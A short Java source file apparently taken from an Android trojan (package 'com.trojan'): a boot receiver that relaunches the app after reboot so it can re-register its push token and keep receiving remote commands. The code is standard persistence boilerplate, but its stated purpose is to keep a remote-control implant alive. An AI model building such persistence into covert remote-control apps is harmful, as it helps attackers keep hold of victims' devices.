package com.trojan;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

/**
 * This BroadcastReceiver listens for the BOOT_COMPLETED action from the Android system.
 * Its only job is to start the MainActivity after the device has finished rebooting.
 * This ensures that the application can re-register its FCM token with the server,
 * allowing it to receive remote commands even if the device has been turned off and on.
 */
public class BootReceiver extends BroadcastReceiver {

    private static final String TAG = "BootReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        // We first check if the broadcast we received is the one we're interested in.
        if (intent != null && Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
            
            Log.i(TAG, "Boot completed event received. Starting MainActivity to ensure registration.");
            
            // Create an Intent that points to our MainActivity.
            Intent mainActivityIntent = new Intent(context, MainActivity.class);
            
            // This flag is CRITICAL. You cannot start an Activity from a BroadcastReceiver
            // without it. It tells the system to create a new task for this activity.
            mainActivityIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            
            // Launch the MainActivity.
            context.startActivity(mainActivityIntent);
        }
    }
}
